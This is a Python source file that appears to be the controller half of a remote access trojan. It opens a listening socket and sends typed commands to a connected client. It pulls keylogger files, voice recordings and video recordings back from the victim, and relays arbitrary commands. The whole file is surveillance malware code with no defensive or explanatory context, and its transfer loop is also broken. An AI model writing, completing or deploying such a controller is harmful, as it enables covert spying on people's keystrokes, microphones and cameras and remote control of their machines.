import socket, pickle, tqdm, os

HOST = '127.0.0.1'
PORT = 44101

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 1024

try:
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    print("socket created and listening")

    server.listen(5)
    print("socket listening")

    while True:
        c, addr = server.accept()
        print(f"conection received from {addr}")
        
        while True:
            command = input("enter command: ").split()
            if command[0] == "exit":
                break
            if command == ["get","keylog"]:
                data = pickle.dumps(command)
                c.sendall(data) 
                recv = c.recv(BUFFER_SIZE).decode()
                filename, filesize = recv.split(SEPARATOR)
                filename = os.path.basename(filename)
                filesize = int(filesize)

                progress = tqdm.tqdm(range(filesize), f"Receving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                with open(filename, 'wb') as f:
                    bytes_read = c.recv(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    f.write(bytes_read)
                    progress.update(len(bytes_read))
            if command == ["get","vorec"]:
                data = pickle.dumps(command)
                c.sendall(data) 
                recv = c.recv(BUFFER_SIZE).decode()
                filename, filesize = recv.split(SEPARATOR)
                filename = os.path.basename(filename)
                filesize = int(filesize)

                progress = tqdm.tqdm(range(filesize), f"Receving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                with open(filename, 'wb') as f:
                    bytes_read = c.recv(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    f.write(bytes_read)
                    progress.update(len(bytes_read))
            if command == ["get","vidrec"]:
                data = pickle.dumps(command)
                c.sendall(data) 
                recv = c.recv(BUFFER_SIZE).decode()
                filename, filesize = recv.split(SEPARATOR)
                filename = os.path.basename(filename)
                filesize = int(filesize)

                progress = tqdm.tqdm(range(filesize), f"Receving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
                with open(filename, 'wb') as f:
                    bytes_read = c.recv(BUFFER_SIZE)
                    if not bytes_read:
                        break
                    f.write(bytes_read)
                    progress.update(len(bytes_read))
            else:
                data = pickle.dumps(command)
                c.sendall(data)
                response = c.recv(1024).decode('utf-8')
                print(response)
        c.close()
        break

except Exception as err:
    print(f"socket creation fialed: {str(err)}")

finally:
    server.close()
